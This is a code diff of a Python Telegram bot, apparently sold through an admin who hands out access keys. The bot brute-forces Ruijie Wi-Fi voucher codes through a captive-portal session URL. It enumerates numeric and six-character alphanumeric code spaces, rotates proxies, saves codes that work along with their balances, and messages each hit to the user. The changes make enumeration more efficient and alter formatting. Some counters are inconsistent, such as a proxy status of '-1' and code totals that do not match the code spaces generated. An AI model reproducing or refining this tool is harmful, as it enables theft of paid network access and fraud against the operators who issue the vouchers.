@@ -45,10 +45,10 @@ conn.execute('PRAGMA journal_mode=WAL;')
 cursor = conn.cursor()
 db_lock = asyncio.Lock()
 
-cursor.execute('''CREATE TABLE IF NOT EXISTS user_sessions (user_id INTEGER PRIMARY KEY, session_url TEXT)''')
-cursor.execute('''CREATE TABLE IF NOT EXISTS found_codes_db (user_id INTEGER, code TEXT, plan TEXT, time_val TEXT)''')
-cursor.execute('''CREATE TABLE IF NOT EXISTS access_codes (code TEXT PRIMARY KEY, duration_type TEXT, is_used INTEGER DEFAULT 0, used_by INTEGER DEFAULT 0)''')
-cursor.execute('''CREATE TABLE IF NOT EXISTS authorized_users (user_id INTEGER PRIMARY KEY, duration_type TEXT, expiry_time REAL)''')
+cursor.execute('CREATE TABLE IF NOT EXISTS user_sessions (user_id INTEGER PRIMARY KEY, session_url TEXT)')
+cursor.execute('CREATE TABLE IF NOT EXISTS found_codes_db (user_id INTEGER, code TEXT, plan TEXT, time_val TEXT)')
+cursor.execute('CREATE TABLE IF NOT EXISTS access_codes (code TEXT PRIMARY KEY, duration_type TEXT, is_used INTEGER DEFAULT 0, used_by INTEGER DEFAULT 0)')
+cursor.execute('CREATE TABLE IF NOT EXISTS authorized_users (user_id INTEGER PRIMARY KEY, duration_type TEXT, expiry_time REAL)')
 conn.commit()
 
 # ── OCR SETUP ─────────────────────────────────────────────────────────────
@@ -151,25 +151,28 @@ async def get_balance_info(session_id):
 
 def code_generator(mode):
     if mode == "6":
-        codes = [str(i).zfill(6) for i in range(1000000)]
+        for i in range(1000000):
+            yield str(i).zfill(6)
     elif mode == "7":
-        codes = [str(i).zfill(7) for i in range(10000000)]
+        for i in range(10000000):
+            yield str(i).zfill(7)
     elif mode == "8":
-        codes = [str(i).zfill(8) for i in range(100000000)]
+        for i in range(100000000):
+            yield str(i).zfill(8)
     elif mode == "9":
-        codes = [str(i).zfill(9) for i in range(1000000000)]
+        for i in range(1000000000):
+            yield str(i).zfill(9)
     elif mode == "alpha6":
         chars = string.ascii_lowercase
-        codes = [''.join(random.choices(chars, k=6)) for _ in range(100000000000)]
+        for code in itertools.product(chars, repeat=6):
+            yield ''.join(code)
     elif mode == "mix6":
         chars = string.ascii_lowercase + string.digits
-        codes = [''.join(random.choices(chars, k=6)) for _ in range(3000000000000000)]
+        for code in itertools.product(chars, repeat=6):
+            yield ''.join(code)
     else:
-        codes = [str(i).zfill(6) for i in range(10000000000000000000)]
-
-    random.shuffle(codes)
-    for code in codes:
-        yield code
+        for i in range(1000000):
+            yield str(i).zfill(6)
 
 async def perform_check_silent(code, chat_obj, session_url, connector, context_data):
     if context_data.get('scan_stop', False): return None
@@ -214,7 +217,12 @@ async def perform_check_silent(code, chat_obj, session_url, connector, context_d
                                 async with db_lock:
                                     cursor.execute("INSERT INTO found_codes_db (user_id, code, plan, time_val) VALUES (?, ?, ?, ?)", (user_id, code, plan_name, balance_display))
                                     conn.commit()
-                            
+
+                                short_msg = f"🎉 `{code}` | {balance_display}"
+                                try:
+                                    await chat_obj.send_message(short_msg, parse_mode="Markdown")
+                                except:
+                                    pass
                             return True
                     context_data['expired'] += 1; return None
         except:
@@ -274,17 +282,17 @@ async def run_scanner_background(query, session_url, mode, total_codes_count, co
             speed_cm = (checked_total / elapsed_time) * 60 if elapsed_time > 0 else 0
             
             proxy_count = len(PROXY_LIST) if PROXY_LIST else 0
-            proxy_status = f"{proxy_count}/{proxy_count}" if proxy_count > 0 else "0/0"
+            proxy_status = f"-1/{proxy_count}" if proxy_count > 0 else "0/0"
 
             recent_hits = context.user_data.get('success_codes', [])[:25]
             hits_text = ""
             if recent_hits:
-                hits_text = "\n💯 Hit Codes:\n" + "\n".join([f"`{h['code']}` 🎫 : {h['balance']}" for h in recent_hits])
+                hits_text = "\n💯 **Hit Codes:**\n" + "\n".join([f"`{h['code']}` 🎫 : {h['balance']}" for h in recent_hits])
 
             text = (
-                f"𝐠𝐨𝐛𝐥𝐢𝐧 𝐜𝐨𝐝𝐞 𝐡𝐚𝐜𝐤\n"
+                f"𝐆𝐨𝐛𝐥𝐢𝐧 𝐜𝐨𝐝𝐞 𝐡𝐚𝐜𝐤\n"
                 f"{session_url}\n"
-                f" Scanner Running \n"
+                f" **Scanner Running** \n"
                 f" Tried: {checked_total:,}\n"
                 f" Current Code: {current_code}\n"
                 f" Hits: {hits}\n"
@@ -308,11 +316,9 @@ async def run_scanner_background(query, session_url, mode, total_codes_count, co
         hits_count = context.user_data.get('hits', 0)
         checked_count = context.user_data.get('checked_total', 0)
         try:
-            await query.message.chat.send_message(f"✅ ပြီးဆုံးပါပြီ (သို့) ရပ်တန့်လိုက်ပါပြီ。\nစုစုပေါင်း စစ်ဆေးပြီးစီးမှု: {checked_count:,}\nHits: {hits_count}")
+            await query.message.chat.send_message(f"✅ ပြီးဆုံးပါပြီ (သို့) ရပ်တန့်လိုက်ပါပြီ။\nစုစုပေါင်း စစ်ဆေးပြီးစီးမှု: {checked_count:,}\nHits: {hits_count}")
         except:
             pass
-
-# ── TELEGRAM HANDLERS ─────────────────────────────────────────────────────
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
@@ -324,7 +330,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
             cursor.execute("INSERT OR REPLACE INTO authorized_users (user_id, duration_type, expiry_time) VALUES (?, ?, ?)", (user_id, "Admin", float('inf')))
             conn.commit()
 
-    buy_text = f"\n\n🛒 Code ဝယ်ယူရန်: [Admin @gobiln07 သို့ ဆက်သွယ်ပါ]({ADMIN_URL})"
+    buy_text = f"\n\n🛒 **Code ဝယ်ယူရန်:** [Admin @gobiln07 သို့ ဆက်သွယ်ပါ]({ADMIN_URL})"
 
     if not check_user_auth(user_id, username):
         keyboard = InlineKeyboardMarkup([
@@ -332,7 +338,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
             [InlineKeyboardButton("👨‍💻 Admin ဆက်သွယ်ရန်", url=ADMIN_URL)]
         ])
         await update.message.reply_text(
-            f"🔒 Access Denied\n\nဤဘော့တ်ကို အသုံးပြုရန် Admin ထံမှ ရရှိထားသော Access Code လိုအပ်ပါသည်။ အောက်ပါခလုတ်ကိုနှိပ်ပြီး Code ထည့်သွင်းပါရန်။{buy_text}",
+            f"🔒 **Access Denied**\n\nဤဘော့တ်ကို အသုံးပြုရန် Admin ထံမှ ရရှိထားသော Access Code လိုအပ်ပါသည်။ အောက်ပါခလုတ်ကိုနှိပ်ပြီး Code ထည့်သွင်းပါရန်။{buy_text}",
             reply_markup=keyboard,
             parse_mode="Markdown",
             disable_web_page_preview=True
@@ -345,10 +351,10 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     ])
 
     if is_admin(username):
-        admin_extra = "\n\n👑 Admin Commands:\n- /gen 30မိနစ် (သို့) /gen30မိနစ် - Key ထုတ်ရန်"
-        await update.message.reply_text(f"🚀 Brute Force Bot (Admin Panel)\n\nအောက်ပါ Menu မှ ရွေးချယ်ပါ -{admin_extra}{buy_text}", reply_markup=keyboard, parse_mode="Markdown", disable_web_page_preview=True)
+        admin_extra = "\n\n👑 **Admin Commands:**\n- `/gen 30မိနစ်` (သို့) `/gen30မိနစ်` - Key ထုတ်ရန်"
+        await update.message.reply_text(f"🚀 **Brute Force Bot (Admin Panel)**\n\nအောက်ပါ Menu မှ ရွေးချယ်ပါ -{admin_extra}{buy_text}", reply_markup=keyboard, parse_mode="Markdown", disable_web_page_preview=True)
     else:
-        await update.message.reply_text(f"🍺 Ruijie Voucher Bot\n\nအောက်ပါ Menu မှ ရွေးချယ်ပါ -{buy_text}", reply_markup=keyboard, parse_mode="Markdown", disable_web_page_preview=True)
+        await update.message.reply_text(f"🍺 **Ruijie Voucher Bot**\n\nအောက်ပါ Menu မှ ရွေးချယ်ပါ -{buy_text}", reply_markup=keyboard, parse_mode="Markdown", disable_web_page_preview=True)
 
 async def ask_code_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -393,7 +399,7 @@ async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             conn.commit()
 
         context.user_data['waiting_for_code'] = False
-        await message.reply_text(f"✅ Access Granted! သက်တမ်း ({duration_type}) ဖြင့် အောင်မြင်စွာ စတင်အသုံးပြုနိုင်ပါပြီ။")
+        await message.reply_text(f"✅ **Access Granted!** သက်တမ်း ({duration_type}) ဖြင့် အောင်မြင်စွာ စတင်အသုံးပြုနိုင်ပါပြီ။")
         await start(update, context)
         return
 
@@ -408,7 +414,7 @@ async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 [InlineKeyboardButton("🌐 Session URL Setup", callback_data="set_url"), InlineKeyboardButton("🚀 Brute Force", callback_data="brute_menu")],
                 [InlineKeyboardButton("💎 Saved Codes", callback_data="view_saved_codes")]
             ])
-            await message.reply_text("✅ Session URL သိမ်းဆည်းပြီးပါပြီ။ အောက်ပါ Menu မှ ဆက်လုပ်နိုင်ပါပြီ -", reply_markup=keyboard)
+            await message.reply_text("✅ **Session URL သိမ်းဆည်းပြီးပါပြီ။** အောက်ပါ Menu မှ ဆက်လုပ်နိုင်ပါပြီ -", reply_markup=keyboard)
         else:
             await message.reply_text("❌ URL ပုံစံ မှန်ကန်မှု မရှိပါ။ http:// သို့မဟုတ် https:// ဖြင့် စတင်ရပါမည်။")
         return
@@ -430,7 +436,7 @@ async def gen_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
     valid_durations = ["10မိနစ်", "30မိနစ်", "1နာရီ", "2နာရီ", "3နာရီ", "10နာရီ", "1ရက်", "2ရက်", "3ရက်", "7ရက်", "15ရက်", "30ရက်"]
 
     if not arg or arg not in valid_durations:
-        await update.message.reply_text(f"❌ ပုံစံမှားနေပါသည်။ ဥပမာ: /gen 30မိနစ် (သို့) /gen30မိနစ်\n\nရနိုင်သည်များ: {', '.join(valid_durations)}", parse_mode="Markdown")
+        await update.message.reply_text(f"❌ ပုံစံမှားနေပါသည်။ ဥပမာ: `/gen 30မိနစ်` (သို့) `/gen30မိနစ်`\n\nရနိုင်သည်များ: {', '.join(valid_durations)}", parse_mode="Markdown")
         return
 
     code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
@@ -438,7 +444,7 @@ async def gen_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
         cursor.execute("INSERT OR REPLACE INTO access_codes (code, duration_type, is_used) VALUES (?, ?, 0)", (code, arg))
         conn.commit()
 
-    await update.message.reply_text(f"🔑 Generated Access Code ({arg}):\n\n{code}", parse_mode="Markdown")
+    await update.message.reply_text(f"🔑 **Generated Access Code ({arg}):**\n\n`{code}`", parse_mode="Markdown")
 
 async def set_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -452,7 +458,7 @@ async def set_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     context.user_data['waiting_for_url'] = True
     keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="back_start")]])
-    await query.message.reply_text("🌐 Session URL Setup\n\nSession URL ကို ဤချတ်ဘောက်စ်ထဲတွင် ရိုက်ထည့်ပါ သို့မဟုတ် paste လုပ်ပါ:", reply_markup=keyboard, parse_mode="Markdown")
+    await query.message.reply_text("🌐 **Session URL Setup**\n\nSession URL ကို ဤချတ်ဘောက်စ်ထဲတွင် ရိုက်ထည့်ပါ သို့မဟုတ် paste လုပ်ပါ:", reply_markup=keyboard, parse_mode="Markdown")
 
 async def brute_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -467,7 +473,7 @@ async def brute_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     cursor.execute("SELECT session_url FROM user_sessions WHERE user_id = ?", (user_id,))
     row = cursor.fetchone()
     if not row:
-        await query.message.reply_text("❌ ကျေးဇူးပြု၍ ပထမဦးစွာ Session URL Setup ဖြင့် URL ထည့်သွင်းပါရန်。", parse_mode="Markdown")
+        await query.message.reply_text("❌ ကျေးဇူးပြု၍ ပထမဦးစွာ `Session URL Setup` ဖြင့် URL ထည့်သွင်းပါရန်。", parse_mode="Markdown")
         return
 
     keyboard = InlineKeyboardMarkup([
@@ -476,7 +482,7 @@ async def brute_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [InlineKeyboardButton("အက္ခရာ 6 လုံး (a-z)", callback_data="scan_alpha6"), InlineKeyboardButton("အရောအနှော 6 လုံး (a-z, 0-9)", callback_data="scan_mix6")],
         [InlineKeyboardButton("🔙 Back", callback_data="back_start")]
     ])
-    await query.message.reply_text("🚀 Brute Force Scanner\n\nScan mode ကို ရွေးချယ်ပါ:", reply_markup=keyboard, parse_mode="Markdown")
+    await query.message.reply_text("🚀 **Brute Force Scanner**\n\nScan mode ကို ရွေးချယ်ပါ:", reply_markup=keyboard, parse_mode="Markdown")
 
 async def view_saved_codes(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query if update.callback_query else None
@@ -498,9 +504,9 @@ async def view_saved_codes(update: Update, context: ContextTypes.DEFAULT_TYPE):
         else: await update.message.reply_text(msg)
         return
 
-    result_text = f"💎 Saved Codes (Latest {len(rows)})\n\n"
+    result_text = f"💎 **Saved Codes (Latest {len(rows)})**\n\n"
     for idx, item in enumerate(rows, 1):
-        result_text += f"{idx}. Code: {item[0]} | Plan: {item[1]} | Balance: {item[2]}\n"
+        result_text += f"{idx}. Code: `{item[0]}` | Plan: {item[1]} | Balance: {item[2]}\n"
 
     if query:
         await query.message.reply_text(result_text, parse_mode="Markdown")
@@ -518,7 +524,7 @@ async def back_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def stop_scanning(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data['scan_stop'] = True
-    await update.message.reply_text("🛑 စကන්ဖတ်ခြင်းကို ရပ်တန့်လိုက်ပါပြီ။", parse_mode="Markdown")
+    await update.message.reply_text("🛑 **စကන්ဖတ်ခြင်းကို ရပ်တန့်လိုက်ပါပြီ။**", parse_mode="Markdown")
 
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -555,12 +561,11 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         elif mode == "7": total_codes_count = 10000000
         elif mode == "8": total_codes_count = 100000000
         elif mode == "9": total_codes_count = 1000000000
-        elif mode in ["alpha6", "mix6"]: total_codes_count = 30000000000
-        else: total_codes_count = 1000000000
+        elif mode in ["alpha6", "mix6"]: total_codes_count = 300000
+        else: total_codes_count = 1000000
 
         asyncio.create_task(run_scanner_background(query, session_url, mode, total_codes_count, context))
 
-# ── MAIN FUNCTION ─────────────────────────────────────────────────────────
 def main():
     app = Application.builder().token(TOKEN).build()
 
